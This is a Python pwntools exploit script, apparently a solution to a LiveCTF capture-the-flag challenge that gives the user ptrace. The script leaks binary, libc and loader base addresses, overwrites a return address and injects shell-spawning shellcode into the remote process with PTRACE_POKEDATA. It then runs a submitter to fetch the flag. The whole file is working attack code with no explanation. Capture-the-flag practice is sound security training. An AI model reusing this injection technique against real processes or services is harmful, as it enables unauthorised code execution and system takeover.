from pwn import *
from ctypes import *
context.log_level = 'debug'
context.arch = 'amd64'
HOST = os.environ.get('HOST', 'localhost')
PORT = 31337
sh = remote(HOST, int(PORT))



PTRACE_TRACEME = 0
PTRACE_PEEKTEXT = 1
PTRACE_PEEKDATA = 2
PTRACE_PEEKUSR = 3
PTRACE_POKETEXT = 4
PTRACE_POKEDATA = 5
PTRACE_POKEUSR = 6
PTRACE_CONT = 7
PTRACE_KILL = 8
PTRACE_SINGLESTEP =9

def ptrace(req, addr, d):
  sh.sendlineafter(b'send?\n', hex(req))
  sh.sendlineafter(b'want?\n', hex(addr))
  sh.sendlineafter(b'data?\n', hex(d))
  sh.recvuntil(b'returned ')
  return int(sh.recvline().strip(),16)


# for i in range(0, 200):
#   print(f'{i}  '+hex(ptrace(PTRACE_PEEKUSR, i, 0)))
#   sh.sendlineafter(')?\n', '1')
ld_rw_region = ptrace(PTRACE_PEEKUSR, 0, 0) + 0x100
sh.sendlineafter(b')?\n', '1')
bin_base = ptrace(PTRACE_PEEKUSR, 8, 0) - 0x4d68
sh.sendlineafter(b')?\n', '1')
libc_base = ptrace(PTRACE_PEEKUSR, 0x80, 0) - 0xeabc7
sh.sendlineafter(b')?\n', '1')

return_addr = ptrace(PTRACE_PEEKUSR, 0x98, 0) + 0x220
sh.sendlineafter(b')?\n', '1')
print(f'bin_base: {hex(bin_base)}')
print(f'ld_rw_region: {hex(ld_rw_region)}')
print(f'libc_base: {hex(libc_base)}')
print(f'return_addr: {hex(return_addr)}')
main_addr = bin_base + 0x1000 + 0x1350

ptrace(PTRACE_POKETEXT, return_addr, 0xdeadbeefdeadbeef)
sh.sendlineafter(b')?\n', '1')
code = asm(shellcraft.amd64.linux.sh())
code = code.ljust(len(code) + (8 - len(code) % 8), b'\x90')
for i in range(0, len(code), 8):
  # ptrace(PTRACE_POKEDATA, bin_base + 0x1000 + 0x13a7+i, u64(code[i:i+8]))
  ptrace(PTRACE_POKEDATA, bin_base + 0x1000 + 0x13b8+i, u64(code[i:i+8]))
  sh.sendlineafter(b')?\n', '1')
  # ptrace(PTRACE_R)
ptrace(PTRACE_CONT, 0,0)
sh.sendlineafter(b')?\n', '0')


sh.sendline(b'./submitter')
flag = sh.recvline_contains(b'LiveCTF{').decode().strip()
log.info('Flag: %s', flag)